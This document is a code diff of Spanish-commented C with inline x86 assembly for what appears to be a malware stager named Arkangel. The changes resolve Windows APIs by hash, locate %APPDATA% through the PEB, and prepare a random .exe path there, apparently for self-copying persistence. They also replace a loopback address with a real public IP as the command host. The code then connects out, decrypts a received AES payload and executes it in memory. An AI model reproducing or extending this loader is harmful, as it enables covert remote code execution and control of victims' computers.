@@ -71,8 +71,8 @@ kernel32_symbol_hashes:
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
         API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
-        API_DEFINE(GetTempPathA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('P') ('a') ('t') ('h') ('A'))
         API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
+        API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    8
@@ -95,8 +95,10 @@ advapi32_symbol_hashes:
 #pragma endregion
 
 #pragma region VARS
+        VAR_DEFINE(APPDATA)
         VAR_DEFINE(pHOST)
         VAR_DEFINE(pKEY)
+        VAR_DEFINE(pMUTEX)
         VAR_DEFINE(hProv)
         VAR_DEFINE(hKey)
         VAR_DEFINE(hSocket)
@@ -110,7 +112,7 @@ over_hashes:
         //Saltamos sobre la configuración
         jmp  over_config
     }
-block_start:
+config_start:
 KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
@@ -123,12 +125,13 @@ KEY:   	//typedef struct aes128Blob{
             //SHA1("karcrack:1234")
         //}
 MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
-HOST:   EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-block_end:
+HOST:   //EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
+        EMIT_BYTE_ARRAY(('2') ('1') ('3') ('.') ('6') ('0') ('.') ('1') ('4') ('4') ('.') ('1') ('7') ('7')(0)) //213.60.144.177
+config_end:
 #pragma endregion
     __asm{
 over_config:
-        //Pasamos inicio real del código saltando sobre las constantes.
+        //Pasamos inicio real del código saltando sobre las funciones.
         jmp  start
 #ifdef ERR_CHECK
 /*###############################################################################
@@ -168,14 +171,6 @@ start:
         *###############################################################################*/
         sub  esp, (STACKSIZE)
         mov  ebp, esp
-        movr(esi, KEY)
-        mov  [ebp+_pKEY], esi
-        lea  ebx, [esi + 36]
-        mov  [ebp+_pHOST], ebx
-
-#pragma region DECRYPT_DATA
-
-#pragma endregion
 
         /*###############################################################################
         ** Carga de APIs:
@@ -188,6 +183,24 @@ start:
         push 0x30                       //v
         pop  esi                        //v
         lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
+        /*###############################################################################
+        ** Obtención de %APPDATA%:
+        ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
+        ** recorremos el bloque de environments en busca de APPDATA=*
+        *###############################################################################*/
+        push eax                        //Guardamos EAX
+        push edi                        //Guardamos el Delta
+        mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
+        mov  edi, [eax+0x48]            //EDI = Environment
+        mov  eax, 0x003D0041            //EAX = "A\0=\0"
+redo:
+        dec edi                         //v
+        dec edi                         //> EDI-=2
+        scasd                           //¿[EDI] == EAX?; EDI+=4
+        jnz redo
+        mov  [ebp+_APPDATA], edi        //Almacenamos el puntero a APPDATA (UNICODE)
+        pop  edi                        //Recuperamos el Delta
+        pop  eax                        //Recuperamos EAX
         mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
@@ -201,7 +214,7 @@ find_kernel32_finished:
         movr(ecx, LoadFunctions)        // Puntero a LoadFunctions()
         movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
 
-        //Cargamos las apis de kernel32 en la pila a partir de los hashes
+        //Cargamos las APIs de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
         call ecx                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA]//EBX = &LoadLibraryA
@@ -234,12 +247,30 @@ find_kernel32_finished:
         push advapi32_count             //v Número de hashes de advapi32
         call ecx                        //>LoadFunctions(advapi32_count);
 
-        add  esp, 0xC
+        add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
         //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4
 
+
+        //ARREGLAR
+        //movr(esi, config_start)
+        //mov  eax, 0x7F
+        //call CreateBuff
+
+        movr(eax, KEY)
+
+        mov  [ebp+_pKEY], eax
+        lea  ebx, [eax+0x1C]
+        mov  [ebp+_pMUTEX], ebx
+        add  ebx, 0x8
+        mov  [ebp+_pHOST], ebx
+
+#pragma region DECRYPT_DATA
+
+#pragma endregion
+
         cdq                             //EDX = 0
-        pushr(MUTEX)                    //v
+        push [ebp+_pMUTEX]              //v
         push edx                        //v
         push edx                        //v
         call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &MUTEX)
@@ -261,26 +292,35 @@ nomtx:
         pop  eax                        //>EAX = 7F
         call CreateBuff                 //Creamos Buffer para la ruta
         mov  edi, eax                   //EDI = EAX
+        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
 
-        push eax                        //v
-        push 0x7F                       //v
-        call [ebp+_GetTempPathA]        //>GetTempPathA(7F, Buff);
-
+copy_again:                             //Copiamos %APPDATA% en el buffer
+        lodsb
+        test al, al
+        jz copy_done
+        stosb
+        inc esi
+        jmp copy_again
+copy_done:
+        //Añadimos a %APPDATA% un nombre al azar.
         cdq                             //EDX = 0
         push edi                        //v
         push edx                        //v
         push edx                        //v
         push edi                        //v
         call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
+        //Reemplazamos la extensión a ".exe"
+        mov  DWORD PTR[edi+5],'exe.'
 
-#define BUFF_SIZE 0x1010101
-_cont:  mov  eax, BUFF_SIZE             //EAX = BUFF_SIZE
+#define BUFF_SIZE 0x5000
+_cont:  xor  eax, eax                   //EAX = 0
+        mov  ah, 0x50                   //EAX = BUFF_SIZE
         call CreateBuff
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
         ** Creación del socket:
-        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerias
+        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerías
         **    creamos el socket para conectarnos al cliente e iniciar la autentificación.
         **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
         *###############################################################################*/
@@ -357,11 +397,10 @@ connected:
         **  el paquete inicial compuesto de:
         **      IV+checksum+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
-        **      *IV(16bytes)    : Vector de inicializacion para el cifrado
+        **      *IV(16bytes)    : Vector de inicialización para el cifrado
         **{{
-        **      *checksum       : checksum de todo el paquete a partir del SizePayload(inclusive), para evitar error crítico al ejecutar.
-        **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
-        **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
+        **      *checksum       : checksum de todo el payload, para evitar error crítico al ejecutar.
+        **      *LOADER_IAT     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
         **}}
         **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(user+pass)
         *###############################################################################*/
@@ -381,7 +420,7 @@ KillSocket:
         jmp  newSocket                  //Creamos un nuevo socket
 
         /*###############################################################################
-        ** Descrifrado y autentificación:
+        ** Descifrado y autentificación:
         **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
         **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
         **    Luego, para evitar ejecutar código erróneo comprobamos el checksum
@@ -405,7 +444,7 @@ init_decrypt:
         //Importamos la clave
         cdq                             //EDX = 0
         push ebp                        //v
-        add  [esp], _hKey               //v Direccion a la variable que contendra el Handler a la key
+        add  [esp], _hKey               //v Dirección a la variable que contendrá el Handler a la key
         push edx                        //v
         push edx                        //v
         push 0x1C                       //v sizeof(aes128Blob)
@@ -413,7 +452,7 @@ init_decrypt:
         push [ebp+_hProv]               //v
         call [ebp+_CryptImportKey]      //>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);
 
-        //Seteamos el valor del IV(Initialization Vector)
+        //Establecemos el valor del IV(Initialization Vector)
         cdq                             //EDX = 0
         push edx                        //v
         push [ebp+_pBuff]               //v
@@ -426,7 +465,7 @@ init_decrypt:
         sub  [ebp+_buffLen], 16         //buffLen-= 16
 
         //Finalmente desciframos los datos obtenidos
-        //Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt
+        //Los datos se encuentran en el paquete así: IV(16Bytes)+DataEncrypt
 
         cdq                             //EDX = 0
 
@@ -464,7 +503,7 @@ FNV1a:
         loop FNV1a                      //>(len--);(len < 0)?
 
         cmp  edx, ebx
-        jne  KillSocket                 //>(EDX==checksum?)Si es igual a cero significa que los datos recibidos eran correctos
+        jne  KillSocket                 //>(EDX==checksum?)
 
         push [ebp+_pKEY]                //v
         push [ebp+_hSocket]             //v
@@ -476,7 +515,7 @@ FNV1a:
         push [ebp+_LoadLibraryA]        //v
 #endif //SC_NULL
         mov  eax, [ebp+_pBuff]          //v
-        add  eax, 0x8                   // Saltamos hasta el cargador_IAT
+        add  eax, 0x4                   // Saltamos hasta el cargador_IAT
         call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
     }
 }
@@ -485,7 +524,7 @@ FNV1a:
 ** LoadFunctions:
 **  Método encargado de rellenar el stack de direcciones.
 **  Llama a la función FindFunction() por cada hash en la lista
-**  almacenando la dirección en su respectiva posicion del stack.
+**  almacenando la dirección en su respectiva posición del stack.
 **  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
 *###############################################################################*/
 void __declspec(naked) LoadFunctions(DWORD numHashes){
@@ -563,7 +602,7 @@ find_function_finished:
         popad
 #pragma endregion AX=HASH;EDX=BaseAddr
 
-        //Guardamos dir en buffer pila
+        //Guardamos dirección en buffer pila
         stosd
         loop nextFunction               //(ECX--);(ECX!=0)?
         mov  ebp, edi
